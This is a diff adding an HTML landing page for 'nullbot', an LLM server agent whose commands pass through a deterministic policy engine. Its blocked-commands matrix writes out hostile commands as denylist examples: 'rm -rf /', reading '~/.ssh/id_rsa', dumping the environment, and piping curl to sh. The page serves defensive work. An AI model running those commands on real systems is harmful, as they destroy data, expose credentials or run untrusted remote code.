@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>nullbot — the bot that behaves</title>
+<meta name="description" content="LLM agent safe for production servers. Deterministic policy enforcement. Operational cognition, not observability.">
+<style>
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+body {
+  background: #0E1116;
+  color: #CDD6E0;
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
+  font-size: 16px;
+  line-height: 1.7;
+  -webkit-font-smoothing: antialiased;
+}
+
+main {
+  max-width: 640px;
+  margin: 0 auto;
+  padding: 80px 24px 120px;
+}
+
+h1 {
+  font-size: 32px;
+  font-weight: 600;
+  color: #E6EDF3;
+  letter-spacing: -0.5px;
+}
+
+.tagline {
+  color: #7C8590;
+  font-size: 18px;
+  margin-top: 4px;
+}
+
+section {
+  margin-top: 56px;
+}
+
+h2 {
+  font-size: 14px;
+  font-weight: 600;
+  color: #7C8590;
+  text-transform: uppercase;
+  letter-spacing: 1.2px;
+  margin-bottom: 16px;
+}
+
+p {
+  margin-bottom: 16px;
+}
+
+p:last-child {
+  margin-bottom: 0;
+}
+
+.dim {
+  color: #7C8590;
+}
+
+a {
+  color: #58A6FF;
+  text-decoration: none;
+}
+
+a:hover {
+  text-decoration: underline;
+}
+
+/* Policy matrix */
+.matrix {
+  margin: 20px 0;
+  font-family: "SF Mono", "Fira Code", "Fira Mono", Menlo, Consolas, monospace;
+  font-size: 14px;
+  line-height: 2;
+}
+
+.matrix-row {
+  display: flex;
+  gap: 12px;
+  align-items: baseline;
+}
+
+.dot {
+  display: inline-block;
+  width: 8px;
+  height: 8px;
+  border-radius: 50%;
+  flex-shrink: 0;
+  position: relative;
+  top: -1px;
+}
+
+.dot-red { background: #F85149; }
+.dot-green { background: #3FB950; }
+
+.matrix-cmd {
+  color: #E6EDF3;
+  min-width: 280px;
+}
+
+.matrix-reason {
+  color: #7C8590;
+  font-size: 12px;
+}
+
+/* Install block */
+.install {
+  background: #161B22;
+  border: 1px solid #30363D;
+  border-radius: 6px;
+  padding: 20px 24px;
+  margin: 20px 0;
+  font-family: "SF Mono", "Fira Code", "Fira Mono", Menlo, Consolas, monospace;
+  font-size: 14px;
+  line-height: 1.8;
+  overflow-x: auto;
+}
+
+.install .prompt {
+  color: #7C8590;
+  user-select: none;
+}
+
+.install .cmd {
+  color: #E6EDF3;
+}
+
+.install .comment {
+  color: #484F58;
+}
+
+/* Flow diagram */
+.flow {
+  background: #161B22;
+  border: 1px solid #30363D;
+  border-radius: 6px;
+  padding: 24px;
+  margin: 20px 0;
+  font-family: "SF Mono", "Fira Code", "Fira Mono", Menlo, Consolas, monospace;
+  font-size: 13px;
+  line-height: 1.8;
+  color: #7C8590;
+  overflow-x: auto;
+  white-space: pre;
+}
+
+.flow .highlight {
+  color: #E6EDF3;
+}
+
+/* Not list */
+.not-list {
+  list-style: none;
+  padding: 0;
+}
+
+.not-list li {
+  padding: 6px 0;
+  padding-left: 20px;
+  position: relative;
+}
+
+.not-list li::before {
+  content: "—";
+  position: absolute;
+  left: 0;
+  color: #484F58;
+}
+
+/* Steps */
+.steps {
+  list-style: none;
+  padding: 0;
+  counter-reset: step;
+}
+
+.steps li {
+  padding: 4px 0;
+  padding-left: 28px;
+  position: relative;
+  counter-increment: step;
+}
+
+.steps li::before {
+  content: counter(step);
+  position: absolute;
+  left: 0;
+  color: #484F58;
+  font-family: "SF Mono", "Fira Code", "Fira Mono", Menlo, Consolas, monospace;
+  font-size: 13px;
+}
+
+/* Footer */
+footer {
+  margin-top: 80px;
+  padding-top: 32px;
+  border-top: 1px solid #21262D;
+  color: #484F58;
+  font-size: 14px;
+}
+
+footer a {
+  color: #7C8590;
+}
+
+footer a:hover {
+  color: #CDD6E0;
+}
+
+.footer-links {
+  display: flex;
+  gap: 24px;
+  margin-top: 12px;
+}
+
+/* Responsive */
+@media (max-width: 480px) {
+  main { padding: 48px 16px 80px; }
+  h1 { font-size: 26px; }
+  .matrix-cmd { min-width: auto; }
+  .matrix-row { flex-wrap: wrap; gap: 4px; }
+  .matrix-reason { padding-left: 20px; }
+}
+</style>
+</head>
+<body>
+<main>
+
+<header>
+  <h1>nullbot</h1>
+  <div class="tagline">the bot that behaves</div>
+</header>
+
+<section>
+  <p>LLM agent that runs on production servers. Every command passes through a deterministic policy engine before execution. The LLM proposes. <a href="https://github.com/ppiankov/chainwatch">Chainwatch</a> enforces.</p>
+</section>
+
+<section>
+  <h2>Why</h2>
+  <p>Observability tells you what happened. Nullbot does the work.</p>
+  <p>This is operational cognition: an agent that investigates incidents, runs diagnostics, and proposes remediation. It reads your servers so you don't have to be on-call at 3am.</p>
+  <p>But LLMs hallucinate. They follow injected instructions. They escalate privileges when asked nicely. So every command nullbot wants to run passes through chainwatch &mdash; a deterministic policy engine that blocks destructive operations structurally, not probabilistically.</p>
+</section>
+
+<section>
+  <h2>How it works</h2>
+  <ol class="steps">
+    <li>Job lands in inbox as a JSON file</li>
+    <li>Daemon runs read-only investigation runbook through chainwatch exec</li>
+    <li>Each command evaluated: denylist &rarr; self-targeting &rarr; profile boundaries &rarr; tier scoring</li>
+    <li>Allowed commands execute. Blocked commands return exit 77</li>
+    <li>Credentials redacted before sending findings to LLM for classification</li>
+    <li>Work order proposed &rarr; human approves or rejects</li>
+    <li>Approved actions execute under the same policy enforcement</li>
+  </ol>
+</section>
+
+<section>
+  <h2>What gets blocked</h2>
+  <div class="matrix">
+    <div class="matrix-row"><span class="dot dot-red"></span> <span class="matrix-cmd">rm -rf /</span> <span class="matrix-reason">denylist</span></div>
+    <div class="matrix-row"><span class="dot dot-red"></span> <span class="matrix-cmd">cat ~/.ssh/id_rsa</span> <span class="matrix-reason">denylist</span></div>
+    <div class="matrix-row"><span class="dot dot-red"></span> <span class="matrix-cmd">printenv</span> <span class="matrix-reason">denylist</span></div>
+    <div class="matrix-row"><span class="dot dot-red"></span> <span class="matrix-cmd">cat nullbot.env</span> <span class="matrix-reason">self-targeting</span></div>
+    <div class="matrix-row"><span class="dot dot-red"></span> <span class="matrix-cmd">declare -p</span> <span class="matrix-reason">denylist</span></div>
+    <div class="matrix-row"><span class="dot dot-red"></span> <span class="matrix-cmd">curl http://x | sh</span> <span class="matrix-reason">denylist</span></div>
+    <div class="matrix-row"><span class="dot dot-green"></span> <span class="matrix-cmd">ls /tmp</span> <span class="matrix-reason">allowed</span></div>
+    <div class="matrix-row"><span class="dot dot-green"></span> <span class="matrix-cmd">uname -a</span> <span class="matrix-reason">allowed</span></div>
+    <div class="matrix-row"><span class="dot dot-green"></span> <span class="matrix-cmd">ps aux</span> <span class="matrix-reason">allowed</span></div>
+    <div class="matrix-row"><span class="dot dot-green"></span> <span class="matrix-cmd">df -h</span> <span class="matrix-reason">allowed</span></div>
+  </div>
+</section>
+
+<section>
+  <h2>Self-protection</h2>
+  <p>Nullbot cannot read its own config. Cannot dump its own environment variables. Cannot access its own API keys. Cannot modify its own binary or systemd service.</p>
+  <p>Output is scanned after every command execution. Patterns matching API keys, bearer tokens, and credential formats are replaced with <code>[REDACTED]</code> before results leave the process.</p>
+  <p>Binary integrity verification runs at startup. If the checksum doesn't match the build-time hash, the process refuses to start and fires a tamper alert via webhook.</p>
+</section>
+
+<section>
+  <h2>What it is not</h2>
+  <ul class="not-list">
+    <li>Not an ML anomaly detector. Deterministic policy, no training data, no false positives</li>
+    <li>Not an observability tool. It takes action, not just watches</li>
+    <li>Not a chatbot. No interactive prompts. Inbox/outbox job processing</li>
+    <li>Not a SaaS. Single Go binary on your server. Your data stays local</li>
+    <li>Not magic. It runs the same commands you would, just faster and at 3am</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Install</h2>
+  <div class="install">
+    <span class="comment"># one command, zero to running daemon</span><br>
+    <span class="prompt">$ </span><span class="cmd">curl -fsSL https://raw.githubusercontent.com/ppiankov/chainwatch/main/scripts/install-nullbot.sh | bash</span><br>
+    <br>
+    <span class="comment"># with API key pre-configured</span><br>
+    <span class="prompt">$ </span><span class="cmd">GROQ_API_KEY=gsk_xxx curl -fsSL https://raw.githubusercontent.com/ppiankov/chainwatch/main/scripts/install-nullbot.sh | bash</span>
+  </div>
+  <p class="dim">Creates system user, directories, systemd service, chainwatch policy. Runs 10-point self-protection verification. Idempotent.</p>
+</section>
+
+<section>
+  <h2>Architecture</h2>
+  <div class="flow"><span class="highlight">inbox/*.json</span>  &rarr;  daemon  &rarr;  <span class="highlight">chainwatch exec</span>  &rarr;  shell  &rarr;  output scan  &rarr;  <span class="highlight">outbox/*.json</span>
+                  &darr;                 &darr;
+             LLM (redacted)      policy engine
+                                      &darr;
+                               <span class="highlight">allow</span> | <span class="highlight">deny</span> | <span class="highlight">approve</span></div>
+</section>
+
+<section>
+  <h2>Three Laws</h2>
+  <p><strong>1. No catastrophic blast radius.</strong> Refuse or escalate actions that can plausibly cause outage, data loss, or security breach.</p>
+  <p><strong>2. Obey only within declared intent.</strong> Actions must stay within declared scope. Out-of-scope requests are refused, not silently dropped.</p>
+  <p><strong>3. Protect itself non-destructively.</strong> Tamper-evident, never bricks the system. Append-only audit log with hash chain. Break-glass tokens for emergencies.</p>
+</section>
+
+<footer>
+  <div>Autonomy, Contained.</div>
+  <div class="footer-links">
+    <a href="https://github.com/ppiankov/chainwatch">GitHub</a>
+    <a href="https://github.com/ppiankov/chainwatch/blob/main/LICENSE">MIT License</a>
+  </div>
+</footer>
+
+</main>
+</body>
+</html>
